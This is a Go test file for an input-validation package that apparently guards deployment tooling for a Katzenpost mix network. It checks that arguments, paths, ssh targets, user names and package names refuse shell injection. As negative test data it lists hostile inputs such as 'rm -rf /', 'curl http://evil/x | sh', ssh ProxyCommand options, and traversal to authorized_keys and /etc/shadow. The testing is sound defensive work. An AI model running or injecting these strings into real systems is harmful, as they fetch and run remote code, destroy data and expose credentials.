package argcheck

import "testing"

func TestArgAcceptsWhatTheNetworkActuallyUses(t *testing.T) {
	for _, ok := range []string{
		"v0.0.104", "annares", "annares.example", "kno@annares.example",
		"pq-katzenpost-mixserver", "kp-dirauth", "storage_replica_0",
	} {
		if err := Arg("value", ok); err != nil {
			t.Errorf("Arg(%q) rejected a real value: %v", ok, err)
		}
	}
	for _, ok := range []string{
		"/usr/local/bin/pq-katzenpost-mixserver",
		"/etc/pq-katzenpost-storage-replica/storage_replica_0.toml",
		"/conf/authority.toml",
	} {
		if err := Path("path", ok); err != nil {
			t.Errorf("Path(%q) rejected a real value: %v", ok, err)
		}
	}
}

func TestArgRefusesShellSyntax(t *testing.T) {
	for _, bad := range []string{
		"v1; rm -rf /", "v1 && id", "v1|id", "v1`id`", "v1$(id)", "v1\nid",
		"v1 v2", "", "a'b", `a"b`, "a>b", "a&b", "a*b",
	} {
		if err := Arg("tag", bad); err == nil {
			t.Errorf("Arg(%q) accepted a value a remote shell would act on", bad)
		}
	}

	for _, bad := range []string{"/etc/x; id", "/etc/$(id)", "/etc/a b", "-rf"} {
		if err := Path("path", bad); err == nil {
			t.Errorf("Path(%q) accepted a value a remote shell would act on", bad)
		}
	}
}

func TestTargetRefusesAnOption(t *testing.T) {
	for _, bad := range []string{"-oProxyCommand=id", "-F/tmp/evil", "-"} {
		if err := Target("ssh target", bad); err == nil {
			t.Errorf("Target(%q) accepted an ssh option as a host", bad)
		}
	}
	if err := Target("ssh target", "annares.example"); err != nil {
		t.Errorf("Target rejected a host: %v", err)
	}
}

func TestUserRefusesAnythingButAnAccountName(t *testing.T) {
	for _, bad := range []string{"kno root", "kno;id", "kno$(id)", "-kno", "", "kno/x"} {
		if err := User("cron user", bad); err == nil {
			t.Errorf("User(%q) accepted a value that is not an account name", bad)
		}
	}
	for _, ok := range []string{"kno", "katzen", "pq-katzenpost-authority", "_kno", "a.b"} {
		if err := User("cron user", ok); err != nil {
			t.Errorf("User(%q) rejected an account name: %v", ok, err)
		}
	}
}

func TestTheInjectionShapesAreAllRefused(t *testing.T) {
	for _, v := range []string{
		"unit; rm -rf /",
		"unit && curl http://evil/x | sh",
		"unit`id`",
		"unit$(id)",
		"unit\nsystemctl stop everything",
		"unit\tstop",
		"unit|tee /etc/passwd",
		"unit>~/.ssh/authorized_keys",
		"unit'x'",
		`unit"x"`,
		"unit\\x",
		"unit*",
		"unit?",
		"unit[a]",
		"unit#comment",
		"unit~root",
		"unit=value",
		"unit\x00null",
		"unit\x1b[31m",
	} {
		if err := Arg("unit", v); err == nil {
			t.Errorf("Arg accepted %q", v)
		}
	}

	for _, v := range []string{
		"-oProxyCommand=/bin/sh",
		"-oProxyCommand=curl evil|sh",
		"--",
		"-",
		"-l root",
	} {
		if err := Target("ssh target", v); err == nil {
			t.Errorf("Target accepted %q", v)
		}
	}

	for _, v := range []string{
		"/usr/local/bin/../../../root/.ssh/authorized_keys",
		"..",
		"../etc/shadow",
		"/etc/katzenpost/..",
		"a/../../b",
	} {
		if err := Path("CONFIG_DST", v); err == nil {
			t.Errorf("Path accepted %q", v)
		}
	}

	for _, v := range []string{
		"/usr/local/bin/pq-katzenpost-mixserver",
		"/etc/pq-katzenpost-storage-replica-0/storage_replica.toml",
		"/var/lib/pq-katzenpost-mixserver/storage_replica_0",
	} {
		if err := Path("CONFIG_DST", v); err != nil {
			t.Errorf("Path refused a real destination %q: %v", v, err)
		}
	}
	for _, v := range []string{"root@power9-internal", "root@mixy", "dwrob@oneeyedman"} {
		if err := Target("ssh target", v); err != nil {
			t.Errorf("Target refused a real host %q: %v", v, err)
		}
	}
	for _, v := range []string{"pq-katzenpost-storage-replica-0", "v0.0.104", "0.0.104-128+dirty"} {
		if err := Arg("value", v); err != nil {
			t.Errorf("Arg refused a real value %q: %v", v, err)
		}
	}
}

func TestPackageNameTakesOnlyWhatDpkgTakes(t *testing.T) {
	for _, ok := range []string{"annares-pq-storagenode-0", "mixy-pq-mixserver", "courier", "a+b.c"} {
		if err := PackageName("service", ok); err != nil {
			t.Errorf("PackageName(%q) rejected a real name: %v", ok, err)
		}
	}
	for _, bad := range []string{
		"", "-pq-mixserver", ".x", "Mixy-pq-mixserver", "mixy_pq", "mixy pq",
		"../x-pq-mixserver", "x/y-pq-mixserver", "x;id-pq-mixserver", "x$(id)-pq-mixserver",
		"x'y-pq-mixserver", "x\n-pq-mixserver",
	} {
		if err := PackageName("service", bad); err == nil {
			t.Errorf("PackageName(%q) accepted a name that is a path or shell syntax", bad)
		}
	}
}
